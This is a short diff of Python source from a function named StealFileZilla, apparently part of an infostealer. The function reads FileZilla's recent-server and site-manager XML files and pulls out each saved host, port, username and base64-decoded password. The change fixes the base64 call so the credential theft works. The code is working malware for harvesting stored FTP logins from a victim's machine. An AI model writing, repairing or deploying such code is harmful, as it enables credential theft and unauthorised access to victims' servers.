@@ -25,7 +25,7 @@ def StealFileZilla():
 			Server = {
 				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
 				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
-				'Password': b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
+				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
 			}
 
 	# Read sitemanager
@@ -37,7 +37,7 @@ def StealFileZilla():
 			Server = {
 				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
 				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
-				'Password': b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
+				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
 			}
 
 	return Server
